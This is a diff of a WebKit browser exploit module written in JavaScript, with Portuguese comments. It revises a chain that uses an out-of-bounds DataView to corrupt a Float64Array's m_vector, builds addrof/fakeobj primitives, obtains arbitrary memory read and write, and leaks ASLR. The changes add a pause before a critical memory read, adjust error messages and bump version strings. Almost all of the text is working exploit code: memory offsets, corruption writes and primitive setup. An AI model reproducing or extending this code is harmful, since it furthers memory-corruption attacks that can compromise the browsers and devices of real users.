@@ -1,10 +1,11 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v118 - R60 Final com Verificação e Robustez Máxima)
+// js/script3/testArrayBufferVictimCrash.mjs (v119 - R61 Final com Ajuste de Leitura de M_VECTOR e Robustez Máxima)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA PARA ROBUSTEZ MÁXIMA E VAZAMENTO REAL E LIMPO DE ASLR:
 // - **NOVA ABORDAGEM: Utiliza OOB DataView para CORROMPER o m_vector de um Float64Array
 //   e obter R/W arbitrário TOTAL. Primitivas addrof_core/fakeobj_core ainda usadas
 //   para obter/forjar endereços de objetos, mas o ARB_READ/ARB_WRITE usa o array corrompido.**
 // - **CORRIGIDO: Chamadas a readQword/writeQword substituídas por oob_read_absolute/oob_write_absolute.**
+// - Ajuste na leitura do m_vector original do oob_dataview para maior robustez.
 // - Redução drástica da verbosidade dos logs de debug para facilitar a leitura.
 // - Spray volumoso e persistente.
 // - Verificação e validação contínuas em cada etapa crítica.
@@ -28,7 +29,7 @@ import {
 
 import { WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v118_R60_ASLR_LEAK_VECTOR_CORRUPTION"; // Renamed for new strategy
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v119_R61_ASLR_LEAK_VECTOR_CORRUPTION"; // Renamed for new strategy
 
 const LOCAL_SHORT_PAUSE = 50;
 const LOCAL_MEDIUM_PAUSE = 500;
@@ -114,7 +115,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         logFn("Primitivas 'addrof_core' e 'fakeobj_core' (no core_exploit.mjs) estão prontas.", "good");
         await pauseFn(LOCAL_SHORT_PAUSE);
 
-        // --- FASE 3: Construindo Primitivas de Leitura/Escrita Arbitrária TOTAL (corrupção de m_vector) ---
+        // --- FASE 3: Construindo Primitivas de Leitura/Escrita Arbitrária TOTAL ---
         // A estratégia é corromper o m_vector de um Float64Array usando o DataView OOB.
         logFn("--- FASE 3: Construindo primitivas de Leitura/Escrita Arbitrária TOTAL (corrupção de m_vector) ---", "subtest");
         const arbSetupStartTime = performance.now();
@@ -129,10 +130,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         await pauseFn(LOCAL_SHORT_PAUSE);
 
         // 3. Calcular o offset do m_vector dentro do JSCell do Float64Array
-        // Nota: O config.mjs define M_VECTOR_OFFSET como 0x10 e M_LENGTH_OFFSET como 0x18.
-        // O log mostrou o m_length sendo expandido para 0x70 (BASE_0x58 + M_LENGTH_0x18).
-        // Isso sugere que a base de metadados é 0x58 e M_VECTOR_OFFSET é de fato 0x10 (resultando em 0x68).
-        // A leitura do m_vector em 0x68 deve ser válida. O problema anterior pode ter sido um estado instável.
         const m_vector_offset_in_jscell = JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET;
         const rw_target_array_m_vector_addr_in_jscell = rw_target_array_jscell_addr.add(m_vector_offset_in_jscell);
         logFn(`Endereço do m_vector de 'rw_target_array' (calculado): ${rw_target_array_m_vector_addr_in_jscell.toString(true)} (offset 0x${m_vector_offset_in_jscell.toString(16)})`, "info");
@@ -146,16 +143,15 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         const OOB_DV_METADATA_BASE = 0x58; // from config.mjs
         const OOB_DV_M_VECTOR_OFFSET_IN_OOB_BUFFER = OOB_DV_METADATA_BASE + JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET; // 0x58 + 0x10 = 0x68
 
-        // O erro anterior era nesta linha. Verifique se o DataView está pronto e se a leitura é segura.
-        // Adicionando uma verificação antes para tentar mitigar instabilidade.
-        if (!oob_dataview) {
-            throw new Error("OOB DataView não está disponível antes de tentar ler seu m_vector.");
+        // Adicionando um PAUSE estratégico antes da leitura crítica do m_vector original do oob_dataview
+        await pauseFn(LOCAL_SHORT_PAUSE); // Pequena pausa para estabilização de memória, se aplicável.
+
+        if (!oob_dataview) { // Re-verificar se a primitiva OOB ainda está válida.
+            throw new Error("OOB DataView se tornou inválido antes de tentar ler seu m_vector.");
         }
-        // Tenta ler o m_vector original do oob_dataview através do oob_read_absolute
-        // que por sua vez usa o oob_dataview_real.getUint32(offset, true)
         original_oob_dataview_m_vector_for_restore = await oob_read_absolute(OOB_DV_M_VECTOR_OFFSET_IN_OOB_BUFFER, 8);
         if (!isAdvancedInt64Object(original_oob_dataview_m_vector_for_restore) || original_oob_dataview_m_vector_for_restore.equals(AdvancedInt64.Zero) || original_oob_dataview_m_vector_for_restore.equals(AdvancedInt64.NaNValue)) {
-            const errorMsg = `Falha crítica ao ler o m_vector original do oob_dataview em ${toHex(OOB_DV_M_VECTOR_OFFSET_IN_OOB_BUFFER)}. Valor lido: ${original_oob_dataview_m_vector_for_restore ? original_oob_dataview_m_vector_for_restore.toString(true) : 'N/A'}. Pode indicar corrupção, layout de memória diferente ou instabilidade após a expansão do m_length.`;
+            const errorMsg = `Falha crítica ao ler o m_vector original do oob_dataview em ${toHex(OOB_DV_M_VECTOR_OFFSET_IN_OOB_BUFFER)}. Valor lido: ${original_oob_dataview_m_vector_for_restore ? original_oob_dataview_m_vector_for_restore.toString(true) : 'N/A'}. Isso pode indicar corrupção, layout de memória diferente, ou que o valor é zero/NaN inesperadamente.`;
             logFn(errorMsg, "critical");
             throw new Error(errorMsg);
         }
@@ -163,7 +159,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
 
 
         // 5. Corromper o m_vector do oob_dataview_real para apontar para o m_vector do rw_target_array
-        await oob_write_absolute(OOB_DV_M_VECTOR_OFFSET_IN_OOB_BUFFER, rw_target_array_m_vector_addr_in_jscell, 8); // Ajustado nome da variável
+        await oob_write_absolute(OOB_DV_M_VECTOR_OFFSET_IN_OOB_BUFFER, rw_target_array_m_vector_addr_in_jscell, 8);
         logFn(`m_vector do oob_dataview_real corrompido para apontar para o m_vector do rw_target_array.`, "info");
         await pauseFn(LOCAL_SHORT_PAUSE);
 
